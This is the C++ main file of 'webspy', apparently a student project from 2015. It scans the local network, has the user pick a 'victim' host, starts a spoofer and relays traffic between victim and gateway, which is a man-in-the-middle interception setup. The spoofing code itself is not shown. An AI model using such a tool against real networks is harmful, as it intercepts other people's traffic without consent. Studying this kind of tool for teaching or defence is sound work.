/*
 * main.cpp
 *
 *  Created on: Apr 6, 2015
 *      Author: Felipe Rodopoulos
 */

// std-cpp
#include <string>
#include <vector>

//std-c
#include <stdio.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/if_link.h>

//wepspy
#include "Globals.h"
#include "Sweeper.h"
#include "Host.h"
#include "Pipe.h"
#include "Spoofer.h"

using namespace std;

static void showUsage(int exitCode){
	fprintf(stderr, "Usage: webspy [-v] [-l] [-i iface] [-V victim]\n");
	fprintf(stderr, "Options:\n");
	fprintf(stderr, "    -h,--help          Show this help message\n");
	fprintf(stderr, "    -v,--verbose       Enable verbose mode\n");
	fprintf(stderr, "    -l,--logging       Enable logging (avaiable at ./log)\n");
	fprintf(stderr, "    -i,--interface     Select the network interface\n");
	fprintf(stderr, "    -V,--victim        Victim IP\n");
	fprintf(stderr, "Developed by Felipe Rodopoulos, 2015\n\n");
	exit(exitCode);
}

static void parseProgramArguments(int argc, char* argv[]){
	for(int i = 1; i < argc; i++){
		std::string arg = argv[i];
		if(arg == "-h" || arg == "--help"){
			showUsage(EXIT_SUCCESS);
		} else if(arg == "-l" || arg == "--logging"){
			Globals::logging = true;
		} else if(arg == "-v" || arg == "--verbose"){
			Globals::verbose = true;
		} else if(arg == "-i" || arg == "--iface"){
			Globals::iface = argv[i + 1];
			i++;
		} else if(arg == "-V" || arg == "--victim"){
			Globals::victim.setIP(argv[i+1]);
			i++;
		} else{
			printf("Unrecognized argument: %s\n", argv[i]);
			showUsage(EXIT_FAILURE);
		}
	}
}

static void showAvaiableInterfaces(std::vector<char*>& ifaceNames){
	struct ifaddrs *ifaces, *it;

	if(getifaddrs(&ifaces)){
		fprintf(stderr, "webspy: [ERRO] Socket Error: could't retrieve interfaces. Try specifying one with -i directive.\n");
		exit(EXIT_FAILURE);
	}
	if(!ifaces){
		fprintf(stderr, "webspy: [ERRO] Socket Error: no interfaces avaiable.\n");
		exit(EXIT_FAILURE);
	}

	printf("Avaiable interfaces:\n");
	it = ifaces;
	int family, i=1;
	while(it != NULL){
		if(it->ifa_addr == NULL){
			continue;
		}

		family = it->ifa_addr->sa_family;
		if(family == AF_INET){
			printf("\t%d - %s\n", i, it->ifa_name);
			ifaceNames.push_back(it->ifa_name);
			i++;
		}
		it = it->ifa_next;
	}
}

static void selectInterface(){

	printf("No interface selected...\n");
	vector<char*> ifacesNames;
	showAvaiableInterfaces(ifacesNames);

	unsigned opt;
	printf("\nOption [id only]: ");
	scanf("%d", &opt);
	getchar();
	// TODO teste de leitura do scanf

	Globals::iface = ifacesNames[opt - 1];
}

static Host& selectVictim(vector<Host> hosts){
	vector<Host>::iterator it;
	int i = 1;
	printf("\nID     IP                  MAC\n");
	for(it = hosts.begin(); it != hosts.end(); it++){
		printf("%-3d    %-15s     %-17s\n", i, Host::ipToString(it->ip).c_str(), Host::macToString(it->mac).c_str());
		i++;
	}
	int op;
	printf("\nSelect victim [ID]: ");
	scanf("%d", &op);
	getchar();
	// TODO teste de leitura do scanf
	return hosts[op - 1];
}

int main(int argc, char* argv[]){
	parseProgramArguments(argc, argv);

	if(Globals::iface == NULL){
		selectInterface();
	}
	if(Globals::verbose)
		printf("Inteface selected: %s\n", Globals::iface);

	Globals::findAttacker();

	Globals::findGateway();
	Sweeper::findHostMAC(&Globals::gateway);
	Globals::gateway.setName("Gateway");
	if(!Host::isDefined(Globals::gateway)){
		printf("Can't find gateway. Exiting ...\n");
		exit(EXIT_SUCCESS);
	}

	Globals::victim.setName("Victim");
	if(!Globals::victim.ip){
		Sweeper sweeper;
		vector<Host>& avaiableHosts = sweeper.sweep();
		if(avaiableHosts.size() == 0){
			fprintf(stderr, "No hosts on the net besides you. Exiting...\n");
			exit(EXIT_SUCCESS);
		}
		Globals::victim = selectVictim(avaiableHosts);
		Globals::victim.setName("Victim");
	} else {
		Sweeper::findHostMAC(&Globals::victim);
		if(!Host::isDefined(&Globals::victim)){
			fprintf(stderr, "Can't find victim. Exiting ...\n");
			exit(EXIT_SUCCESS);
		}
	}

	if(Globals::verbose){
		Globals::attacker.toString();
		Globals::gateway.toString();
		Globals::victim.toString();
	}

	Spoofer spoofer;
	spoofer.init();

	//Renderer renderer();

	Pipe gateway2victim(Globals::victim, Globals::gateway);
	gateway2victim.init();

	Pipe victim2gateway(Globals::gateway, Globals::victim);
	victim2gateway.init();

	printf("Loop...\n");
	int i = 0;
	while(1 == 1){
		i = 1 - i;
	}
	printf("Apertae pra sair do programa");
	getchar();
	return 0;
}
